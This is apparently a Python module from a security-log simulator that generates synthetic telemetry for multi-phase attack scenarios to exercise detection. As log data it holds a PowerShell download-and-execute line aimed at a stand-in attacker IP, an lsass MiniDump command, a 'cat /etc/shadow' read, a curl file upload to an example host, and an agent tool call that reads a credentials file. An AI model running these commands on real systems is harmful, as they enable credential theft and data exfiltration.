"""
Authentic Scenario Packs (Wave 2)
=================================
Executable multi-phase, multi-event sequences over the Wave-1 + Wave-2
authentic engine surface. Each pack:

  * emits the intended vendor-native RAW sourcetypes (engine formatters only,
    no fabricated formats)
  * threads correlation metadata (netspout_run_id / netspout_scenario_id /
    netspout_phase / netspout_event_id / netspout_parent_event_id) ONLY on
    LogEntry fields (HEC-side), never inside RAW
  * records causal linkage: detection events reference the event id of the
    triggering activity
  * is deterministic per run_id (crc-derived field tokens, staged timestamps)

The catalog declarations live in catalog/scenarios.json
(wave2_* ids, maturity CONTRACTED). This module is the executable layer;
scenario contracts end-to-end are validated in tests.

NOTE: emitting a scenario event is NOT detection validation. These packs
generate telemetry; detection coverage must be proven by real searches.
"""

import zlib
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional

try:
    from netspout_core.models import LogEntry, Node, NodeType
    from netspout_core.wave1_authentic_engine import Wave1AuthenticEngine as W1
    from netspout_core.wave2_authentic_engine import Wave2AuthenticEngine as W2
except ImportError:  # pragma: no cover
    try:
        from app.models import LogEntry, Node, NodeType
    except ImportError:
        from models import LogEntry, Node, NodeType
    from wave1_authentic_engine import Wave1AuthenticEngine as W1
    from wave2_authentic_engine import Wave2AuthenticEngine as W2


SCENARIO_PACK_IDS = [
    "wave2_ws_credential_compromise_chain",
    "wave2_cloud_identity_sso_hunt",
    "wave2_aws_recon_escalation",
    "wave2_linux_auth_anomaly",
    "wave2_agentic_ai_exfil_attempt",
    "wave2_k8s_container_escape",
    "wave2_c2_callback_detection",
    "wave2_bigip_openconfig_itops",
]


def _sha(seed: str) -> str:
    return f"{zlib.crc32(seed.encode('utf-8')):08x}"


def _tag(entries, run_id: str, scenario_id: str, phase: str,
         parent_map: Optional[Dict[str, str]] = None) -> List[LogEntry]:
    """Thread run/phase/scenario metadata onto LogEntry fields only.

    Accepts nested lists (some formatters return correlated pairs).
    """
    flat: List[LogEntry] = []
    for item in entries:
        if isinstance(item, (list, tuple)):
            flat.extend(item)
        else:
            flat.append(item)
    entries = flat
    tagged: List[LogEntry] = []
    seq = 0
    prev_id = None
    for e in entries:
        seq += 1
        event_id = f"{scenario_id}-{phase}-{seq}"
        e.netspout_run_id = run_id
        e.netspout_scenario_id = scenario_id
        e.netspout_phase = phase
        e.netspout_event_id = event_id
        e.netspout_parent_event_id = prev_id
        if parent_map and event_id in parent_map:
            e.netspout_ground_truth = parent_map[event_id]
        prev_id = event_id
        tagged.append(e)
    return tagged


def _host(kind: str, run_id: str) -> str:
    return f"{kind}-{_sha(kind + run_id)[:6].upper()}"


def _ip(seed: str, run_id: str) -> str:
    n = (zlib.crc32((seed + run_id).encode()) >> 8) & 0xffff
    return f"10.42.{(n >> 8) % 250}.{n % 250 + 1}"


def run_scenario_pack(scenario_id: str, run_id: Optional[str] = None,
                      source_ip: str = "203.0.113.66") -> List[LogEntry]:
    """Run a Wave-2 authentic scenario pack; returns ordered LogEntry list."""
    if run_id is None:
        run_id = f"pf-wave2-{int(datetime.now(timezone.utc).timestamp())}"
    if scenario_id == "wave2_ws_credential_compromise_chain":
        return _ws_credential_chain(run_id, source_ip)
    if scenario_id == "wave2_cloud_identity_sso_hunt":
        return _cloud_identity_sso_hunt(run_id, source_ip)
    if scenario_id == "wave2_aws_recon_escalation":
        return _aws_recon(run_id, source_ip)
    if scenario_id == "wave2_linux_auth_anomaly":
        return _linux_auth_anomaly(run_id, source_ip)
    if scenario_id == "wave2_agentic_ai_exfil_attempt":
        return _agentic_exfil(run_id, source_ip)
    if scenario_id == "wave2_k8s_container_escape":
        return _k8s_escape(run_id, source_ip)
    if scenario_id == "wave2_c2_callback_detection":
        return _c2_callback(run_id, source_ip)
    if scenario_id == "wave2_bigip_openconfig_itops":
        return _itops_window(run_id, source_ip)
    raise ValueError(f"Unknown Wave-2 scenario pack: {scenario_id}")


def run_all_scenario_packs(run_id: Optional[str] = None) -> Dict[str, List[LogEntry]]:
    rid = run_id or f"pf-wave2-{int(datetime.now(timezone.utc).timestamp())}"
    return {sid: run_scenario_pack(sid, rid) for sid in SCENARIO_PACK_IDS}


# ---------------------------------------------------------------------------
# Pack implementations
# ---------------------------------------------------------------------------

def _ws_credential_chain(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-win-workstation", name=_host("WINWS", run_id),
                  type=NodeType.WEB_SERVER, ip_address="10.42.7.31")
    secs: List[LogEntry] = []
    host = device.name

    # Phase 1 baseline
    secs.extend(_tag(W1.format_windows_security_xml_log(
        device=device, family="logon_success", actor_user="jrestate",
        actor_domain="CORP", src_ip="10.42.7.88", host_name=host),
        run_id, "wave2_ws_credential_compromise_chain", "BASELINE"))
    # Phase 2 recon: 4625 bursts
    recon: List[LogEntry] = []
    recon.extend(W1.format_windows_security_xml_log(
        device=device, family="logon_failure", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        signature="credential-stuffing", status="breached"))
    recon.append(W2.format_windows_ntlm_xml_log(
        device=device, family="client_request", host_name=host, src_ip=attacker,
        user_name="CORP\\svc-ldap", signature="ntlm-chase", status="breached"))
    secs.extend(_tag(recon, run_id, "wave2_ws_credential_compromise_chain",
                     "RECON_CREDENTIAL_FAILURES"))

    # Phase 3 initial access: 4624+4672 pair, then 4688
    access: List[LogEntry] = []
    access.extend(W1.format_windows_security_xml_log(
        device=device, family="logon_success", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        signature="lateral-logon", status="breached"))
    proc = W1.format_windows_security_xml_log(
        device=device, family="process_creation", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        status="breached")
    secs.extend(_tag(access[:2], run_id,
                     "wave2_ws_credential_compromise_chain", "INITIAL_ACCESS"))
    # process creation (4688) is its own entry with parent linkage
    secs.extend(_tag(proc, run_id, "wave2_ws_credential_compromise_chain",
                     "INITIAL_ACCESS"))

    # Phase 4 execution: PowerShell + sysmon
    exe: List[LogEntry] = []
    exe.append(W1.format_windows_powershell_xml_log(
        device=device, family="script_block", host_name=host, src_ip=attacker,
        script_block="IEX (New-Object Net.WebClient).DownloadString('http://%s/p.ps1')"
                     % attacker,
        user="CORP\\svc-ldap", status="breached", signature="ps-scriptblock"))
    exe.append(W1.format_windows_sysmon_xml_log(
        device=device, family="process_create", host_name=host,
        src_ip=attacker, dest_ip=_ip("c2", run_id),
        process_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgA",
        user="CORP\\svc-ldap", status="breached", signature="sysmon-proc"))
    exe.append(W1.format_windows_sysmon_xml_log(
        device=device, family="dns_query", host_name=host, src_ip=attacker,
        dest_ip=_ip("c2", run_id),
        process_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgA",
        user="CORP\\svc-ldap", status="breached", signature="sysmon-dns"))
    secs.extend(_tag(exe, run_id, "wave2_ws_credential_compromise_chain",
                     "EXECUTION"))

    # Phase 5 credential access: lsass + NTLM
    cred: List[LogEntry] = []
    cred.append(W1.format_windows_sysmon_xml_log(
        device=device, family="process_access", host_name=host,
        src_ip=attacker, dest_ip=device.ip_address,
        process_image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump",
        user="CORP\\svc-ldap", status="breached", signature="lsass-access"))
    cred.append(W1.format_windows_security_xml_log(
        device=device, family="file_access", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        status="breached"))
    cred.append(W1.format_windows_sysmon_xml_log(
        device=device, family="image_loaded", host_name=host,
        src_ip=attacker, dest_ip=device.ip_address,
        process_image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump",
        user="CORP\\svc-ldap", status="breached", signature="sysmon-imgload"))
    secs.extend(_tag(cred, run_id, "wave2_ws_credential_compromise_chain",
                     "CREDENTIAL_ACCESS"))

    # Phase 6 detection: EDR + Defender
    det: List[LogEntry] = []
    det.extend(W1.format_crowdstrike_falcon_sensor_log(
        device=device, family="DetectSummaryEvent", src_ip=attacker,
        dest_ip=_ip("c2", run_id),
        process_image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump",
        user="CORP\\svc-ldap", status="breached"))
    det.append(W2.format_windows_defender_xml_log(
        device=device, family="detection", host_name=host, src_ip=attacker,
        threat_name="Trojan:Win32/Wacatac.B!ml", status="breached"))
    det.append(W2.format_windows_defender_xml_log(
        device=device, family="remediation", host_name=host, src_ip=attacker,
        threat_name="Trojan:Win32/Wacatac.B!ml", status="blocked"))
    secs.extend(_tag(det, run_id, "wave2_ws_credential_compromise_chain",
                     "EDR_RESPONSE"))
    return secs


def _cloud_identity_sso_hunt(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-id-cloud-edge", name="id-cloud-edge",
                  type=NodeType.CLOUD_TRANSIT, ip_address="10.42.8.4")
    secs: List[LogEntry] = []

    # Baseline successful sign-ins across vendors
    base: List[LogEntry] = []
    base.append(W1.format_o365_management_log(
        device=device, family="user_login", src_ip="10.42.8.21",
        user_id="analyst@contoso.com"))
    base.append(W1.format_azure_monitor_aad_log(
        device=device, family="sign_in_success", src_ip="10.42.8.21",
        status="normal"))
    base.append(W1.format_okta_log(device=device, family="user_session_start",
                                   src_ip="10.42.8.21"))
    base.append(W2.format_gws_login_log(device=device, family="login_success",
                                        src_ip="10.42.8.21",
                                        actor_email="analyst@contoso.com",
                                        status="normal"))
    secs.extend(_tag(base, run_id, "wave2_cloud_identity_sso_hunt", "BASELINE"))

    # Credential stuffing: M365 + Entra + Okta + GWS failures
    attack: List[LogEntry] = []
    for op_user in ("finance@contoso.com", "helpdesk@contoso.com",
                    "analyst@contoso.com"):
        evts = W1.format_o365_management_log(
            device=device, family="user_login_failed", src_ip=attacker,
            user_id=op_user, signature="o365-stuffing", status="breached")
        attack.extend(evts if isinstance(evts, (list, tuple)) else [evts])
        attack.append(W1.format_azure_monitor_aad_log(
            device=device, family="sign_in_failure", src_ip=attacker,
            signature="entra-stuffing", status="breached"))
        attack.append(W2.format_gws_login_log(device=device,
                                              family="login_failure",
                                              src_ip=attacker,
                                              actor_email=op_user,
                                              signature="gws-stuffing",
                                              status="breached"))
    attack.append(W1.format_okta_log(
        device=device, family="policy_signon_denial", src_ip=attacker,
        user_email="finance@contoso.com", signature="okta-deny",
        action="blocked"))
    # Evidenced Wave-1 okta extension: suspicious activity report
    attack.append(W1.format_okta_log(
        device=device, family="suspicious_activity_report",
        src_ip="10.42.8.21", user_email="analyst@contoso.com",
        status="normal"))
    secs.extend(_tag(attack, run_id, "wave2_cloud_identity_sso_hunt",
                     "CREDENTIAL_STUFFING"))

    # Escalation: role grant in Azure Activity Log (authentic pinned schema)
    esc: List[LogEntry] = []
    esc.append(W2.format_azure_activity_log(
        device=device, family="admin_action", src_ip=attacker,
        operation_name="Add role assignment to directory role",
        signature="entra-role-escalation", status="breached"))
    esc.append(W2.format_azure_activity_log(
        device=device, family="alert_action", src_ip=attacker,
        signature="azure-alert", status="breached"))
    secs.extend(_tag(esc, run_id, "wave2_cloud_identity_sso_hunt", "ESCALATION"))
    return secs


def _aws_recon(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-aws-cloud", name="aws-cloud-ingress",
                  type=NodeType.CLOUD_TRANSIT, ip_address="10.42.9.4")
    secs: List[LogEntry] = []

    base = W1.format_aws_cloudtrail_log(
        device=device, family="console_login", src_ip="10.42.9.21",
        status="normal")
    secs.extend(_tag(base if isinstance(base, (list, tuple)) else [base],
                     run_id, "wave2_aws_recon_escalation", "BASELINE"))

    # Console login failure burst (failed console logins)
    attack: List[LogEntry] = []
    for _i in range(3):
        evts = W1.format_aws_cloudtrail_log(
            device=device, family="console_login", src_ip=attacker,
            status="breached", signature="aws-stuffing")
        attack.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    secs.extend(_tag(attack, run_id, "wave2_aws_recon_escalation",
                     "LOGIN_FAILURES"))

    # Privilege escalation: AssumeRole + RunInstances + PutRolePolicy
    esc: List[LogEntry] = []
    for fam in ("assume_role", "run_instances", "put_role_policy"):
        evts = W1.format_aws_cloudtrail_log(
            device=device, family=fam, src_ip=attacker,
            status="breached", signature="aws-escalation")
        esc.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    secs.extend(_tag(esc, run_id, "wave2_aws_recon_escalation",
                     "PRIVILEGE_ESCALATION"))

    # Network activity: VPC flow ACCEPT/REJECT/SKIPDATA mix
    net: List[LogEntry] = []
    net.append(W2.format_aws_vpcflow_log(device=device, family="flow_accept",
                                         src_ip="10.42.9.21",
                                         dest_ip="10.42.9.55",
                                         dest_port=443))
    net.append(W2.format_aws_vpcflow_log(device=device, family="flow_reject",
                                         src_ip=attacker,
                                         dest_ip="10.42.9.55",
                                         dest_port=22, status="blocked",
                                         action="blocked"))
    net.append(W2.format_aws_vpcflow_log(device=device, family="flow_skipdata",
                                         src_ip="-", dest_ip="-"))
    secs.extend(_tag(net, run_id, "wave2_aws_recon_escalation", "NETWORK_VALIDATE"))
    return secs


def _linux_auth_anomaly(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-linux-host", name=_host("NIX", run_id),
                  type=NodeType.WEB_SERVER, ip_address="10.42.10.17")
    secs: List[LogEntry] = []

    # Baseline: normal sshd accept + auditd syscall reads
    base: List[LogEntry] = []
    base.append(W2.format_linux_messages_log(
        device=device, family="sshd_message", src_ip="10.42.10.50",
        message="Accepted publickey for netops from 10.42.10.50 port 49304 "
                "ssh2: RSA SHA256:%s" % _sha("ssh|ok|" + run_id)))
    secs.extend(_tag(base, run_id, "wave2_linux_auth_anomaly", "BASELINE"))

    # Brute force: sshd failure bursts + linux messages
    attack: List[LogEntry] = []
    for pwd_user in ("admin", "root", "oracle"):
        attack.append(W2.format_linux_messages_log(
            device=device, family="sshd_message", src_ip=attacker,
            message="Failed password for invalid user %s from %s port %d "
                    "ssh2" % (pwd_user, attacker, 49872 + (len(pwd_user) % 90)),
            status="breached"))
        evts = W1.format_linux_auditd_log(
            device=device, family="user_auth_failure", src_ip=attacker,
            account=pwd_user, status="breached")
        attack.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    secs.extend(_tag(attack, run_id, "wave2_linux_auth_anomaly", "BRUTE_FORCE"))

    # Credential access: execve of /etc/shadow + sudo root usage
    cred: List[LogEntry] = []
    evts = W1.format_linux_auditd_log(
        device=device, family="syscall_execve", src_ip=attacker,
        target_exe="/usr/bin/cat", target_args="/etc/shadow",
        status="breached")
    cred.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    cred.append(W2.format_linux_messages_log(
        device=device, family="sudo_message", src_ip=attacker,
        status="breached"))
    cred.append(W1.format_sysmon_linux_log(
        device=device, family="process_create", src_ip=attacker,
        dest_ip=device.ip_address,
        process_image="/bin/cat", command_line="cat /etc/shadow",
        user="root", status="breached", signature="sysmon-linux-proc"))
    secs.extend(_tag(cred, run_id, "wave2_linux_auth_anomaly", "CRED_DUMP"))
    return secs


def _agentic_exfil(run_id: str, attacker: str) -> List[LogEntry]:
    ollama_dev = Node(id="wave2-ollama-runtime", name="ollama-runtime",
                      type=NodeType.CLOUD_TRANSIT, ip_address="10.42.11.8")
    agent_dev = Node(id="wave2-mcp-agent", name="mcp-agent-host",
                     type=NodeType.CLOUD_TRANSIT, ip_address="10.42.11.9")
    secs: List[LogEntry] = []

    # Baseline inference + server lifecycle
    base: List[LogEntry] = []
    for fam in ("server_config", "model_store", "gpu_inventory", "runner_wait"):
        base.append(W2.format_ollama_server_log(device=ollama_dev, family=fam))
    base.append(W2.format_mcp_jsonrpc_log(device=agent_dev,
                                          family="server_lifecycle",
                                          src_ip="10.42.11.9"))
    secs.extend(_tag(base, run_id, "wave2_agentic_ai_exfil_attempt", "BASELINE"))

    # Sensitive tool call from the agent
    tool: List[LogEntry] = []
    tool.append(W2.format_mcp_jsonrpc_log(
        device=agent_dev, family="request", src_ip=attacker,
        tool_name="fs.read_file",
        tool_args={"path": "C:\\Users\\Administrator\\Documents\\credentials.txt"},
        signature="mcp-sensitive", status="breached"))
    tool.append(W2.format_ollama_server_log(
        device=ollama_dev, family="runner_wait", src_ip=attacker,
        status="breached"))
    tool.append(W1.format_osquery_results_log(
        device=agent_dev, family="processes", src_ip=attacker,
        status="breached", signature="osquery-proc"))
    secs.extend(_tag(tool, run_id, "wave2_agentic_ai_exfil_attempt",
                     "SENSITIVE_TOOL_CALL"))

    # Deny + audit
    den: List[LogEntry] = []
    den.append(W2.format_mcp_jsonrpc_log(
        device=agent_dev, family="error", src_ip=attacker,
        signature="mcp-deny", status="blocked", action="blocked"))
    secs.extend(_tag(den, run_id, "wave2_agentic_ai_exfil_attempt",
                     "TOOL_POLICY_DENY"))
    return secs


def _k8s_escape(run_id: str, attacker: str) -> List[LogEntry]:
    cluster = Node(id="wave2-k8s-cluster", name="k8s-apiserver",
                   type=NodeType.CLOUD_TRANSIT, ip_address="10.42.12.9")
    node = Node(id="wave2-k8s-node", name="k8s-worker-1",
                type=NodeType.CLOUD_TRANSIT, ip_address="10.42.12.11")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W2.format_kube_audit_log(device=cluster, family="pod_create",
                                         src_ip="10.42.12.50"))
    secs.extend(_tag(base, run_id, "wave2_k8s_container_escape", "BASELINE"))

    probe: List[LogEntry] = []
    probe.append(W2.format_kube_audit_log(device=cluster, family="secret_read",
                                          src_ip=attacker,
                                          status="breached"))
    probe.append(W2.format_kube_audit_log(
        device=cluster, family="exec_into_pod", src_ip=attacker,
        status="breached"))
    secs.extend(_tag(probe, run_id, "wave2_k8s_container_escape", "RBAC_PROBE"))

    esc: List[LogEntry] = []
    esc.append(W2.format_falco_log(device=node, family="terminal_shell",
                                   src_ip=attacker))
    esc.append(W2.format_falco_log(device=node, family="sensitive_file_read",
                                   src_ip=attacker))
    esc.append(W2.format_falco_log(device=node, family="write_below_etc",
                                   src_ip=attacker, status="breached"))
    secs.extend(_tag(esc, run_id, "wave2_k8s_container_escape",
                     "CONTAINER_ESCAPE"))

    det: List[LogEntry] = []
    det.append(W1.format_suricata_eve_log(
        device=node, family="alert", src_ip=_ip("c2", run_id),
        dest_ip=node.ip_address, dest_port=443, proto="TCP",
        status="breached"))
    det.append(W1.format_osquery_results_log(
        device=node, family="open_sockets", src_ip=attacker,
        status="breached", signature="osquery-socket"))
    secs.extend(_tag(det, run_id, "wave2_k8s_container_escape", "DETECTION"))
    return secs


def _c2_callback(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-sase-edge", name="mixed-sase-edge",
                  type=NodeType.SASE_PROXY, ip_address="10.42.13.6")
    host = Node(id="wave2-c2-victim", name=_host("VICTIM", run_id),
                type=NodeType.WEB_SERVER, ip_address="10.42.13.44")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W1.format_suricata_eve_log(device=device, family="http",
                                           src_ip=host.ip_address,
                                           dest_ip="93.184.216.34",
                                           dest_port=80, proto="TCP",
                                           status="normal"))
    secs.extend(_tag(base, run_id, "wave2_c2_callback_detection", "BASELINE"))

    call: List[LogEntry] = []
    call.append(W1.format_suricata_eve_log(
        device=device, family="alert", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=443, proto="TCP",
        signature="et-malware-c2", status="breached"))
    call.append(W1.format_suricata_eve_log(
        device=device, family="dns_query", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=53, proto="UDP",
        signature="c2-dns", status="breached"))
    call.append(W1.format_suricata_eve_log(
        device=device, family="tls", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=443, proto="TCP",
        signature="c2-tls", status="breached"))
    call.append(W1.format_suricata_eve_log(
        device=device, family="fileinfo", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=443, proto="TCP",
        signature="c2-file", status="breached"))
    secs.extend(_tag(call, run_id, "wave2_c2_callback_detection", "CALLBACK"))

    dis: List[LogEntry] = []
    dis.append(W1.format_osquery_results_log(
        device=host, family="open_sockets", src_ip=host.ip_address,
        status="breached", signature="osquery-socket"))
    dis.append(W1.format_osquery_results_log(
        device=host, family="processes", src_ip=host.ip_address,
        status="breached", signature="osquery-proc"))
    secs.extend(_tag(dis, run_id, "wave2_c2_callback_detection", "DISCOVERY"))
    return secs


def _itops_window(run_id: str, attacker: str) -> List[LogEntry]:
    adc = Node(id="wave2-bigip-adc", name="bigip-adc-01",
               type=NodeType.LOAD_BALANCER, ip_address="10.42.14.3")
    fw = Node(id="wave2-estreamer-fw", name="cisco-sfr-fw",
              type=NodeType.FIREWALL, ip_address="10.42.14.4")
    node = Node(id="wave2-nvm-endpoint", name="nvm-endpoint-01",
                type=NodeType.WEB_SERVER, ip_address="10.42.14.77")
    ftp = Node(id="wave2-crushftp", name="crushftp-01",
               type=NodeType.WEB_SERVER, ip_address="10.42.14.20")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W2.format_cisco_sfw_estreamer_log(
        device=fw, family="intrusion_event", src_ip="10.42.14.100",
        dest_ip=ftp.ip_address, status="normal"))
    base.append(W2.format_cisco_nvm_v2_log(
        device=node, family="nvzflow_v11_record", src_ip=node.ip_address,
        dest_ip="104.20.23.154", dest_port=80, status="normal"))
    base.append(W2.format_crushftp_log(device=ftp, family="session_login",
                                       src_ip="10.42.14.100",
                                       user="ops_archivist"))
    secs.extend(_tag(base, run_id, "wave2_bigip_openconfig_itops", "BASELINE"))

    win: List[LogEntry] = []
    win.append(W2.format_crushftp_log(
        device=ftp, family="session_command_read", src_ip=attacker,
        signature="crushftp-exploit", status="breached", action="alerted"))
    win.append(W2.format_cisco_sfw_estreamer_log(
        device=fw, family="intrusion_event", src_ip=attacker,
        dest_ip=ftp.ip_address,
        intrusion_message="SERVER-WEBAPP CrushFTP zip INCLUDE path traversal attempt",  # noqa
        classification="Web Application Attack", status="breached"))
    win.append(W2.format_crushftp_log(device=ftp, family="session_transfer",
                                      src_ip="10.42.14.100",
                                      user="ops_archivist"))
    secs.extend(_tag(win, run_id, "wave2_bigip_openconfig_itops", "MAINTENANCE"))

    dr: List[LogEntry] = []
    dr.append(W2.format_cisco_nvm_v2_log(
        device=node, family="nvzflow_v11_record", src_ip=node.ip_address,
        dest_ip=_ip("c2", run_id), dest_port=443,
        process_path="/usr/bin/curl",
        process_args="curl -F file=@invoice_q1.csv https://files.example.com/u",
        status="breached"))
    secs.extend(_tag(dr, run_id, "wave2_bigip_openconfig_itops", "DRIFT"))
    return secs
